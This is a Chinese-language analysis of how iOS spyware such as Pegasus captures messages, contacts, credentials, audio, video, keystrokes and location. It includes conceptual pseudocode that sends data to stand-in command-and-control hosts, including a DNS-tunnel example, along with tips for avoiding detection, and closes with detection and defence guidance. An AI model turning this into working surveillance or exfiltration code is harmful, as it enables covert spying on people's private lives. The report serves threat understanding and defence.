@@TITLE@@iOS 数据采集能力深度分析
@@SUBTITLE@@iOS Data Collection Capabilities Deep Dive Analysis
@@INFO@@报告日期|2026年10月14日
@@INFO@@分析范围|iOS 平台间谍软件数据采集能力全景：通信拦截、设备数据提取、实时监控、位置追踪、加密绕过技术
@@INFO@@威胁等级|极高——数据采集是间谍软件的核心价值
@@INFO@@联系方式|Telegram: https://t.me/one00190

@@TOC@@目录

# 概述

## 1.1 数据采集的战略意义

在商业间谍软件领域，数据采集能力是衡量一个间谍软件平台价值的核心指标。对于 Pegasus 等顶级间谍软件而言，其商业价值直接取决于能够从目标设备上提取多少、多深、多隐蔽的数据。

iOS 平台的数据采集面临独特挑战：

- **沙箱隔离**：每个 App 运行在独立沙箱中，无法直接访问其他 App 的数据
- **端到端加密**：iMessage、WhatsApp、Signal 等使用端到端加密保护通信内容
- **硬件加密**：设备数据使用硬件密钥加密，物理提取极其困难
- **权限控制**：iOS 严格的权限系统限制 App 对敏感数据的访问

间谍软件通过内核级权限绕过这些限制，实现对目标设备的全面数据控制。

## 1.2 数据采集能力矩阵

| 数据类别 | 采集方式 | 难度 | 价值 |
|---------|---------|------|------|
| 通信内容 | 加密前/后拦截 | 高 | 极高 |
| 通讯录 | SQLite 数据库读取 | 低 | 高 |
| 照片/视频 | Photo Library 访问 | 低 | 高 |
| 位置信息 | CoreLocation + 基站 | 中 | 高 |
| 密码/凭据 | Keychain 提取 | 高 | 极高 |
| 应用数据 | 沙箱内数据库读取 | 中 | 高 |
| 实时音频 | 麦克风激活 | 中 | 高 |
| 实时视频 | 摄像头激活 | 中 | 高 |
| 屏幕内容 | 截图/录屏 | 中 | 高 |
| 按键输入 | 键盘记录 | 中 | 高 |
| 浏览历史 | Safari 数据库读取 | 低 | 中 |
| 邮件内容 | Mail 数据库读取 | 低 | 高 |
| 日历/提醒 | EventKit 数据库 | 低 | 中 |
| 财务数据 | 银行 App 拦截 | 极高 | 极高 |

## 1.3 报告结构

本报告系统分析 iOS 平台的数据采集能力，覆盖：

1. **通信拦截**：iMessage、WhatsApp、Signal、电话等
2. **设备数据提取**：通讯录、照片、邮件、浏览历史等
3. **实时监控**：麦克风、摄像头、屏幕、按键等
4. **位置追踪**：GPS、WiFi、基站 triangulation
5. **加密绕过**：端到端加密绕过技术
6. **数据存储与回传**：C2 通信、数据加密、分批回传
7. **反检测**：数据采集的反检测技术
8. **防御与检测**：如何发现和防御数据采集

---

# 通信拦截

## 2.1 iMessage 拦截

### 2.1.1 拦截原理

iMessage 使用端到端加密保护消息内容，但间谍软件可以在加密之前或解密之后捕获明文：

```
发送方：
  明文 → iMessage 加密 → 网络传输
  
接收方：
  网络传输 → iMessage 解密 → 明文显示
  
间谍软件拦截点：
  发送方：在加密前钩子 imagent 函数 → 捕获明文
  接收方：在解密后钩子 imagent 函数 → 捕获明文
```

### 2.1.2 技术实现

**内核级钩子**：

```
// 概念性伪代码（非实际利用代码）
// 钩子 iMessage 发送函数

original_send_message = imagent_send_message;

hooked_send_message(message) {
    // 在加密前捕获明文
    log_message("OUTGOING", message.plain_text);
    
    // 调用原始函数
    return original_send_message(message);
}

// 钩子 iMessage 接收函数
original_receive_message = imagent_receive_message;

hooked_receive_message(encrypted_message) {
    // 调用原始函数解密
    plain_message = original_receive_message(encrypted_message);
    
    // 在解密后捕获明文
    log_message("INCOMING", plain_message.plain_text);
    
    return plain_message;
}
```

**数据提取**：

iMessage 数据存储在 SQLite 数据库中：

```
数据库路径：/var/mobile/Library/SMS/sms.db

关键表：
- message：存储所有消息
- handle：存储联系人信息
- attachment：存储附件信息
- chat：存储对话信息
- chat_message_join：关联对话和消息
```

### 2.1.3 拦截内容

| 数据类型 | 说明 | 存储位置 |
|---------|------|---------|
| 文本消息 | iMessage 文本内容 | sms.db message 表 |
| 图片/视频 | 附件媒体文件 | sms.db attachment 表 |
| 位置分享 | 位置共享消息 | sms.db 特殊消息类型 |
| Tapback | 表情回应 | sms.db 特殊消息类型 |
| 已删除消息 | 可能仍然可恢复 | sms.db（未物理删除） |

## 2.2 WhatsApp 拦截

### 2.2.1 拦截原理

WhatsApp 使用 Signal 协议实现端到端加密。间谍软件通过以下方式绕过：

**方法一：进程注入**

```
WhatsApp 进程
    │
    ├─ 消息接收 → 解密 → 显示
    │                │
    │           间谍软件注入
    │                │
    │           捕获解密后明文
    │
    └─ 消息发送 → 加密前
                    │
               间谍软件注入
                    │
               捕获加密前明文
```

**方法二：辅助功能 API**

```
间谍软件 → 辅助功能 API → 读取 WhatsApp 屏幕内容
```

**方法三：本地数据库**

```
WhatsApp 本地数据库：
/var/mobile/Containers/Data/Application/<WhatsApp-UUID>/
    └─ Database/
        └─ ChatStorage.sqlite

包含：
- 消息内容（加密存储，但密钥可从 Keychain 提取）
- 联系人信息
- 群组信息
- 媒体文件引用
```

### 2.2.2 拦截内容

| 数据类型 | 说明 | 拦截难度 |
|---------|------|---------|
| 文本消息 | WhatsApp 文本内容 | 中 |
| 图片/视频 | 媒体附件 | 中 |
| 语音消息 | 语音消息文件 | 中 |
| 位置分享 | 位置信息 | 中 |
| 联系人 | 联系人信息 | 低 |
| 群组 | 群组信息 | 低 |

## 2.3 Signal 拦截

### 2.3.1 拦截挑战

Signal 的安全设计使其比 WhatsApp 更难拦截：

- **更严格的沙箱**：Signal 使用更严格的沙箱配置
- **内存保护**：Signal 在内存中加密敏感数据
- **屏幕安全**：Signal 阻止截图和屏幕录制
- **通知隐私**：Signal 隐藏通知内容

### 2.3.2 拦截方法

**方法一：内核级钩子**

```
// 在 Signal 进程的网络层钩子
// 捕获加密前的发送数据和解密后的接收数据
```

**方法二：屏幕捕获**

```
// 在 Signal 显示消息时截取屏幕
// 需要绕过 Signal 的屏幕保护机制
```

**方法三：辅助功能**

```
// 使用辅助功能 API 读取 Signal 界面内容
// 需要用户授权辅助功能权限
```

## 2.4 电话通话拦截

### 2.4.1 传统电话

```
电话通话流程：
  麦克风 → 音频编码 → 基带处理 → 网络传输
  
间谍软件拦截点：
  在音频编码前钩子 → 捕获原始音频
  在基带处理后钩子 → 捕获编码后音频
```

### 2.4.2 VoIP 通话

```
VoIP 通话（FaceTime、WhatsApp 通话等）：
  麦克风 → 音频编码 → 加密 → 网络传输
  
间谍软件拦截点：
  在音频编码前钩子 → 捕获原始音频
  在加密前钩子 → 捕获编码后音频
```

### 2.4.3 通话录音实现

```
// 概念性伪代码
// 钩子 CoreAudio 框架

original_audio_callback = CoreAudio_input_callback;

hooked_audio_callback(buffer) {
    // 保存音频数据到文件
    save_audio_to_file(buffer, "call_recording.wav");
    
    // 调用原始回调
    return original_audio_callback(buffer);
}
```

## 2.5 短信/传统 SMS 拦截

### 2.5.1 拦截原理

传统 SMS 不加密，间谍软件可以直接读取：

```
SMS 数据库：/var/mobile/Library/SMS/sms.db

与 iMessage 共用同一数据库
通过消息类型字段区分 SMS 和 iMessage
```

### 2.5.2 拦截内容

| 数据类型 | 说明 |
|---------|------|
| 短信内容 | 文本短信 |
| 彩信内容 | 多媒体短信 |
| 发送/接收时间 | 时间戳 |
| 联系人信息 | 发送方/接收方 |
| 已删除短信 | 可能仍然可恢复 |

---

# 设备数据提取

## 3.1 通讯录提取

### 3.1.1 数据库位置

```
通讯录数据库：
/var/mobile/Library/AddressBook/AddressBook.sqlitedb

包含表：
- ABPerson：联系人基本信息
- ABMultiValue：电话、邮箱等多值字段
- ABPersonFullTextSearch_content：全文搜索索引
```

### 3.1.2 提取内容

| 字段 | 说明 |
|------|------|
| 姓名 | 联系人姓名 |
| 电话 | 电话号码 |
| 邮箱 | 电子邮件地址 |
| 地址 | 物理地址 |
| 公司 | 公司信息 |
| 职位 | 职位信息 |
| 生日 | 生日信息 |
| 备注 | 备注信息 |
| 照片 | 联系人照片 |
| 社交账号 | 社交媒体账号 |

### 3.1.3 提取代码

```
// 概念性伪代码
// 直接读取 SQLite 数据库

db = sqlite3_open("/var/mobile/Library/AddressBook/AddressBook.sqlitedb");
query = "SELECT * FROM ABPerson";
results = sqlite3_exec(db, query);

for (row in results) {
    contact = {
        name: row.first_name + " " + row.last_name,
        phone: get_phone_numbers(row.ID),
        email: get_emails(row.ID),
        ...
    };
    send_to_c2(contact);
}
```

## 3.2 照片和视频提取

### 3.2.1 存储位置

```
照片库：
/var/mobile/Media/DCIM/
    └─ 100APPLE/
        └─ IMG_0001.JPG
        └─ IMG_0002.JPG
        └─ ...

照片数据库：
/var/mobile/Media/PhotoLibrary/Photos.sqlite

包含：
- 照片元数据（时间、位置、尺寸等）
- 相册信息
-  face detection 数据
```

### 3.2.2 提取内容

| 数据类型 | 说明 |
|---------|------|
| 照片文件 | JPEG/HEIC 格式照片 |
| 视频文件 | MOV/MP4 格式视频 |
| 截图 | 屏幕截图 |
| Live Photos | 动态照片 |
| 全景照片 | 全景照片 |
| 元数据 | EXIF 数据（GPS、时间、设备等） |
| 相册结构 | 相册组织信息 |
| 人脸识别 | 人脸检测数据 |

### 3.2.3 提取方法

```
// 方法一：直接文件系统访问
// 遍历 /var/mobile/Media/DCIM/ 目录
// 复制所有照片和视频文件

// 方法二：通过 Photo Library API
// 使用 PHAsset 等 API 访问照片库
// 可以获取更完整的元数据

// 方法三：通过 Photos.sqlite 数据库
// 读取照片元数据
// 根据元数据定位实际文件
```

## 3.3 邮件提取

### 3.3.1 存储位置

```
Mail 数据库：
/var/mobile/Library/Mail/
    └─ Protected/
        └─ <account-uuid>/
            └─ MailData/
                └─ envelope index

包含：
- 邮件元数据（发件人、收件人、主题、时间）
- 邮件正文（可能加密）
- 附件引用
```

### 3.3.2 提取内容

| 数据类型 | 说明 |
|---------|------|
| 邮件正文 | 邮件文本内容 |
| 附件 | 邮件附件文件 |
| 发件人 | 发件人地址 |
| 收件人 | 收件人地址 |
| 主题 | 邮件主题 |
| 时间 | 发送/接收时间 |
| 文件夹结构 | 邮箱文件夹组织 |

## 3.4 浏览历史提取

### 3.4.1 Safari 数据库

```
Safari 数据库：
/var/mobile/Library/Safari/History.sqlite

包含表：
- history_items：访问过的 URL
- history_visits：访问记录（时间、标题等）
- bookmarks：书签
- reading_list：阅读列表
```

### 3.4.2 提取内容

| 数据类型 | 说明 |
|---------|------|
| URL | 访问过的网址 |
| 标题 | 页面标题 |
| 访问时间 | 访问日期和时间 |
| 访问次数 | 每个 URL 的访问次数 |
| 书签 | 保存的书签 |
| 阅读列表 | 稍后阅读的文章 |
| 搜索历史 | Safari 搜索记录 |
| 标签页 | 当前打开的标签页 |

## 3.5 密码和凭据提取

### 3.5.1 Keychain 结构

```
Keychain 数据库：
/var/Keychains/keychain-2.db

Keychain 存储：
- 应用密码
- WiFi 密码
- 网站凭据
- 加密密钥
- 证书
- 安全笔记
```

### 3.5.2 提取挑战

Keychain 提取是数据采集中最具挑战性的任务之一：

- **硬件加密**：Keychain 数据使用硬件密钥加密
- **访问控制**：每个 Keychain 项有访问控制列表
- **生物识别保护**：某些项需要 Face ID/Touch ID
- **设备锁保护**：设备锁定后无法访问某些项

### 3.5.3 提取方法

```
// 方法一：内核级提取
// 在内核中钩子 Keychain 访问函数
// 捕获解密后的 Keychain 数据

// 方法二：内存提取
// 在设备解锁时从内存中提取 Keychain 数据
// 需要访问进程内存空间

// 方法三：备份提取
// 创建 iTunes 备份
// 从备份中提取 Keychain 数据
// 需要知道设备密码或备份密码
```

## 3.6 应用数据提取

### 3.6.1 应用沙箱结构

```
每个 App 的数据存储在独立沙箱中：
/var/mobile/Containers/Data/Application/<App-UUID>/
    ├─ Documents/
    ├─ Library/
    │   ├─ Caches/
    │   ├─ Preferences/
    │   └─ <App-specific databases>/
    └─ tmp/
```

### 3.6.2 高价值目标应用

| 应用类型 | 代表应用 | 数据价值 |
|---------|---------|---------|
| 即时通讯 | WhatsApp, Telegram, WeChat | 极高 |
| 社交媒体 | Facebook, Twitter, Instagram | 高 |
| 银行金融 | 各银行 App,支付宝,微信支付 | 极高 |
| 邮件 | Gmail, Outlook | 高 |
| 云存储 | Dropbox, Google Drive, iCloud | 高 |
| 笔记 | Notes, Evernote | 中 |
| 日历 | Calendar | 中 |
| 健康 | Health, fitness apps | 中 |

### 3.6.3 提取方法

```
// 方法一：直接文件系统访问
// 由于拥有 root 权限，可以直接访问任何 App 的沙箱
// 读取沙箱中的 SQLite 数据库和文件

// 方法二：应用特定漏洞
// 利用特定应用的安全漏洞
// 提取应用数据

// 方法三：API 钩子
// 钩子应用的 API 调用
// 捕获应用处理的数据
```

---

# 实时监控

## 4.1 麦克风录音

### 4.1.1 录音实现

```
// 概念性伪代码
// 激活麦克风并录音

audio_session = AVAudioSession.sharedInstance();
audio_session.setCategory(AVAudioSessionCategoryPlayAndRecord);

audio_recorder = AVAudioRecorder(url: recording_url, settings: settings);
audio_recorder.record();

// 录音完成后上传到 C2
upload_to_c2(recording_file);
```

### 4.1.2 录音模式

| 模式 | 说明 | 触发条件 |
|------|------|---------|
| 手动录音 | C2 指令触发 | 远程指令 |
| 定时录音 | 按时间表录音 | 预设时间 |
| 事件触发 | 特定事件触发 | 来电、消息等 |
| 持续录音 | 持续后台录音 | 长期监控 |

### 4.1.3 反检测

- **静音录音**：不播放提示音
- **后台录音**：不显示录音指示器
- **短时录音**：每次只录几秒，减少被发现概率
- **低质量录音**：减小文件大小，减少流量异常

## 4.2 摄像头拍照

### 4.2.1 拍照实现

```
// 概念性伪代码
// 激活摄像头并拍照

capture_session = AVCaptureSession();
capture_device = AVCaptureDevice.defaultDevice(withMediaType: AVMediaTypeVideo);
capture_input = AVCaptureDeviceInput(device: capture_device);
capture_session.addInput(capture_input);

capture_output = AVCapturePhotoOutput();
capture_session.addOutput(capture_output);

capture_session.startRunning();
capture_output.capturePhoto(with: settings, delegate: self);

// 拍照完成后上传到 C2
upload_to_c2(photo_data);
```

### 4.2.2 拍照模式

| 模式 | 说明 | 触发条件 |
|------|------|---------|
| 手动拍照 | C2 指令触发 | 远程指令 |
| 定时拍照 | 按时间表拍照 | 预设时间 |
| 事件触发 | 特定事件触发 | 解锁设备等 |
| 前后摄像头 | 选择摄像头 | 远程配置 |

### 4.2.3 反检测

- **静音拍照**：不播放快门声
- **无闪光拍照**：禁用闪光灯
- **后台拍照**：不显示相机界面
- **快速拍照**：缩短拍照时间

## 4.3 屏幕截图

### 4.3.1 截图实现

```
// 方法一：使用私有 API
// 调用 iOS 私有截图 API

// 方法二：使用 IOKit
// 通过 IOKit 直接访问帧缓冲区

// 方法三：使用 CoreGraphics
// 使用 CoreGraphics 截图功能
```

### 4.3.2 截图模式

| 模式 | 说明 | 触发条件 |
|------|------|---------|
| 手动截图 | C2 指令触发 | 远程指令 |
| 定时截图 | 按时间表截图 | 预设时间 |
| 事件触发 | 特定事件触发 | App 切换等 |
| 持续截图 | 高频截图（类似录屏） | 长期监控 |

### 4.3.3 反检测

- **无快门声**：截图不播放声音
- **无缩略图**：不显示截图缩略图
- **后台截图**：不显示截图动画
- **选择性截图**：只在特定 App 中截图

## 4.4 按键记录

### 4.4.1 记录实现

```
// 方法一：钩子键盘输入
// 在 UIKit 层钩子键盘输入事件

original_key_handler = UIKeyboardImpl.handleKeyPress;

hooked_key_handler(key_event) {
    log_key(key_event.key, key_event.timestamp);
    return original_key_handler(key_event);
}

// 方法二：辅助功能 API
// 使用辅助功能 API 监听键盘事件

// 方法三：自定义键盘
// 安装自定义键盘扩展
// 记录所有按键输入
```

### 4.4.2 记录内容

| 数据类型 | 说明 |
|---------|------|
| 按键字符 | 按下的字符 |
| 按键时间 | 按键时间戳 |
| 应用上下文 | 当前正在输入的应用 |
| 输入字段 | 当前输入框类型 |
| 删除操作 | 删除的字符 |
| 粘贴操作 | 粘贴的内容 |

### 4.4.3 反检测

- **无 UI 显示**：不显示键盘记录界面
- **低频率上传**：批量上传按键数据
- **加密存储**：本地加密存储按键数据
- **选择性记录**：只记录特定应用的输入

---

# 位置追踪

## 5.1 GPS 定位

### 5.1.1 定位实现

```
// 概念性伪代码
// 获取 GPS 位置

location_manager = CLLocationManager();
location_manager.requestAlwaysAuthorization();
location_manager.startUpdatingLocation();

location = location_manager.location;
latitude = location.coordinate.latitude;
longitude = location.coordinate.longitude;
altitude = location.altitude;
accuracy = location.horizontalAccuracy;

send_to_c2({latitude, longitude, altitude, accuracy, timestamp});
```

### 5.1.2 定位模式

| 模式 | 精度 | 功耗 | 说明 |
|------|------|------|------|
| GPS | 极高（< 10m） | 高 | 卫星定位 |
| WiFi | 中（10-100m） | 低 | WiFi 热点定位 |
| 基站 | 低（100m-1km） | 极低 | 基站 triangulation |
| 混合 | 高 | 中 | 多种方法组合 |

## 5.2 WiFi 定位

### 5.2.1 原理

```
WiFi 定位原理：
1. 扫描周围 WiFi 热点
2. 获取每个热点的 BSSID（MAC 地址）和信号强度
3. 查询 Apple 的 WiFi 位置数据库
4. 根据多个热点的位置计算设备位置
```

### 5.2.2 实现

```
// 扫描 WiFi 热点
wifi_networks = scan_wifi_networks();

for (network in wifi_networks) {
    bssid = network.bssid;  // MAC 地址
    ssid = network.ssid;    // 网络名称
    rssi = network.rssi;    // 信号强度
    
    send_to_c2({bssid, ssid, rssi, timestamp});
}

// C2 服务器查询 WiFi 位置数据库
// 计算设备位置
```

## 5.3 基站定位

### 5.3.1 原理

```
基站定位原理：
1. 获取当前连接的手机基站信息
2. 包括：MCC（移动国家码）、MNC（移动网络码）、LAC（位置区域码）、CI（小区 ID）
3. 查询基站位置数据库
4. 根据基站位置估算设备位置
```

### 5.3.2 实现

```
// 获取基站信息
telephony_info = CTTelephonyNetworkInfo();
cell_info = telephony_info.subscriberCellularProvider;

mcc = cell_info.mobileCountryCode;
mnc = cell_info.mobileNetworkCode;

// 获取更详细的基站信息
// 需要私有 API 或内核级访问
cell_tower = get_current_cell_tower();
lac = cell_tower.lac;
ci = cell_tower.ci;

send_to_c2({mcc, mnc, lac, ci, timestamp});
```

## 5.4 位置历史

### 5.4.1 位置数据库

```
位置历史数据库：
/var/mobile/Library/Caches/locationd/
    └─ caches.plist
    └─ clients.plist

包含：
- 历史位置记录
- 位置缓存
- 位置服务使用记录
```

### 5.4.2  Significant Locations

```
Significant Locations 数据库：
/var/mobile/Library/Caches/locationd/
    └─ significant.sqlite

包含：
- 用户频繁访问的位置
- 位置访问时间
- 位置访问频率
```

---

# 加密绕过技术

## 6.1 端到端加密绕过

### 6.1.1 绕过原理

端到端加密保护消息在网络传输中的安全，但无法保护消息在设备上的明文状态：

```
发送方设备：
  明文 → [间谍软件捕获] → 加密 → 网络
  
接收方设备：
  网络 → 解密 → [间谍软件捕获] → 明文
```

### 6.1.2 绕过方法

| 方法 | 原理 | 适用场景 |
|------|------|---------|
| 进程注入 | 注入到应用进程中钩子加密/解密函数 | 大多数应用 |
| API 钩子 | 钩子应用使用的加密 API | 使用标准加密库的应用 |
| 内存提取 | 从应用内存中提取解密后的数据 | 所有应用 |
| 屏幕捕获 | 截取显示在屏幕上的明文 | 所有应用 |
| 键盘记录 | 记录用户输入的明文 | 所有应用 |
| 数据库访问 | 直接读取应用本地数据库 | 本地存储明文的应用 |

## 6.2 设备加密绕过

### 6.2.1 iOS 数据保护

iOS 使用硬件级数据保护：

```
数据保护层级：
- Complete Protection（完全保护）：设备锁定时不可访问
- Protected Unless Open（除非打开否则保护）：文件打开期间可访问
- Protected Until First User Authentication（首次认证后保护）：解锁后可访问
- No Protection（无保护）：始终可访问
```

### 6.2.2 绕过方法

```
// 方法一：内核级访问
// 拥有内核权限后，可以直接访问文件系统
// 绕过文件级加密

// 方法二：Keychain 提取
// 从 Keychain 中提取文件解密密钥
// 使用密钥解密文件

// 方法三：内存提取
// 设备解锁后，解密密钥存在于内存中
// 从内存中提取密钥并解密文件
```

## 6.3 应用级加密绕过

### 6.3.1 应用自定义加密

某些应用使用自定义加密保护本地数据：

```
应用自定义加密：
  用户密码 → 密钥派生 → 加密密钥 → 加密数据
  
绕过方法：
  1. 从应用内存中提取加密密钥
  2. 钩子应用的加密/解密函数
  3. 提取用户密码（通过键盘记录或内存提取）
  4. 逆向工程应用的加密实现
```

---

# 数据存储与回传

## 7.1 本地存储

### 7.1.1 存储策略

```
采集的数据首先存储在本地：
/var/mobile/Library/Preferences/com.pegasus.config.plist
    └─ 配置信息

/var/mobile/Library/Caches/com.pegasus.data/
    └─ 采集的数据（加密存储）

/var/mobile/Library/Caches/com.pegasus.db/
    └─ 数据索引数据库
```

### 7.1.2 加密存储

```
// 本地数据使用 AES-256 加密
encryption_key = derive_key_from_device_id();

for (data_item in collected_data) {
    encrypted = AES_256_Encrypt(data_item, encryption_key);
    save_to_file(encrypted);
}
```

## 7.2 C2 通信

### 7.2.1 通信协议

```
C2 通信使用 HTTPS 协议：
  POST https://c2-server.com/api/data
  
  Headers:
    Content-Type: application/octet-stream
    X-Device-ID: <device-identifier>
    Authorization: Bearer <token>
  
  Body:
    <encrypted data>
```

### 7.2.2 通信策略

| 策略 | 说明 |
|------|------|
| 定时通信 | 按固定时间间隔与 C2 通信 |
| 事件触发 | 采集到重要数据时立即通信 |
| 流量控制 | 控制通信频率和数据量 |
| 域名轮换 | 定期更换 C2 域名 |
| 失败重试 | 通信失败时自动重试 |

### 7.2.3 数据分批回传

```
// 大数据集分批回传
data_chunks = split_data(large_dataset, chunk_size=1MB);

for (chunk in data_chunks) {
    wait_for_optimal_time();  // 等待网络条件良好
    encrypt(chunk);
    send_to_c2(chunk);
    wait_random_delay();  // 随机延迟避免模式检测
}
```

## 7.3 反检测通信

### 7.3.1 流量伪装

```
// 伪装成正常流量
// 使用合法 CDN 域名
// 模拟正常应用的通信模式
// 控制流量大小和频率
```

### 7.3.2 DNS 隧道

```
// 使用 DNS 查询传输数据
// 将数据编码在 DNS 查询中
// 绕过防火墙和流量检测

data = "sensitive_data";
encoded = base32_encode(data);
dns_query(encoded + ".c2-domain.com");
```

---

# 防御与检测

## 8.1 检测方法

### 8.1.1 行为检测

| 异常行为 | 可能指示 |
|---------|---------|
| 电池消耗异常增加 | 后台持续运行恶意进程 |
| 数据流量异常 | C2 通信或数据回传 |
| 设备发热异常 | 持续录音或计算 |
| 存储空间异常减少 | 大量数据本地存储 |
| 未知进程运行 | 恶意组件运行 |
| 异常网络连接 | C2 通信 |

### 8.1.2 MVT 检测

Amnesty International 的 MVT 工具：

```
mvt-ios check-backup --backup /path/to/backup

# 检测项目：
# - 已知 Pegasus C2 域名和 IP
# - 异常描述文件
# - 异常系统日志
# - 异常进程
# - 异常网络连接
# - 异常文件系统修改
```

### 8.1.3 网络检测

```
# 使用网络监控工具检测异常流量
# - DNS 查询异常
# - TLS 指纹异常
# - 流量模式异常
# - 连接目标异常
```

## 8.2 防御措施

### 8.2.1 系统级防御

- **保持更新**：及时安装 iOS 安全更新
- **启用 Lockdown Mode**：减少攻击面
- **使用硬件安全密钥**：防止 SIM 交换和钓鱼
- **定期重启**：某些数据采集组件在重启后需要重新植入

### 8.2.2 应用级防御

- **使用端到端加密应用**：Signal 等经过验证的加密通信工具
- **启用应用锁**：为敏感应用添加额外保护
- **审查应用权限**：定期检查应用权限
- **使用隐私保护应用**：隐私浏览器、加密笔记等

### 8.2.3 用户级防御

- **提高警惕**：对可疑链接和消息保持警惕
- **不越狱**：越狱设备更容易被数据采集
- **物理安全**：防止设备被物理接触
- **定期检测**：使用 MVT 等工具定期检测设备安全

---

# 总结

## 9.1 关键发现

1. **数据采集能力极其全面**：现代间谍软件可以采集 iOS 设备上的几乎所有数据

2. **端到端加密可以被绕过**：间谍软件通过加密前/后拦截绕过端到端加密

3. **内核权限是关键**：拥有内核权限后，几乎所有数据都可以被提取

4. **反检测技术成熟**：间谍软件使用多种技术避免被检测

5. **防御需要多层策略**：单一防御措施不足以阻止数据采集

## 9.2 防御建议

1. **保持系统更新**：及时修复安全漏洞
2. **启用 Lockdown Mode**：高风险用户必须启用
3. **使用加密通信**：Signal 等经过验证的工具
4. **定期检测**：使用 MVT 等工具定期检测
5. **提高安全意识**：对可疑活动保持警惕

---

**联系方式**

Telegram: https://t.me/one00190

---

*本报告仅供安全研究和教育目的使用。报告中提及的技术分析旨在帮助安全研究人员理解 iOS 数据采集技术，提升防御能力。请勿将报告内容用于任何非法目的。所有概念性代码仅用于说明原理，非实际可利用代码。*
